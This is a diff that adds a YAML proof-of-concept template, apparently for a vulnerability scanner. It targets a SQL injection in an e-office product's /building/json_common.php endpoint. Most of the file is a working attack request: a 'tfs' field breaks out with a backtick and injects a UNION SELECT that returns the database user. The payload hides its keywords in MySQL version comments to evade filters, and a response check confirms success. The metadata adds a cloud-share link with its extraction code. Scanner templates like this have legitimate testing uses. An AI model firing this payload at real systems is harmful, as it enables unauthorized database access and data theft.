@@ -1,0 +1,26 @@
+name: poc-yaml-eoffice-json-common-sql-inject
+groups:
+  sql_inject:
+    - method: POST
+      path: /building/json_common.php
+      follow_redirects: false
+      headers: 
+        Content-Type: application/x-www-form-urlencoded
+      body:
+        tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,user() ,4#|2|333
+      expression: |
+        response.status == 200 && response.body.bcontains(b"[\"")
+  api_exist:
+    - method: POST
+      path: /building/json_common.php
+      follow_redirects: false
+      headers: 
+        Content-Type: application/x-www-form-urlencoded
+      expression: |
+        response.status == 200 && response.body.bcontains(b"[\"data error!\"]")
+detail:
+  author: test
+  info: |
+    链接：https://pan.baidu.com/s/1nD6MqWkQXX-AZ4hIQH2AzA 提取码：z2w7
+  links:
+    - https://blog.csdn.net/CommputerMac/article/details/133915877
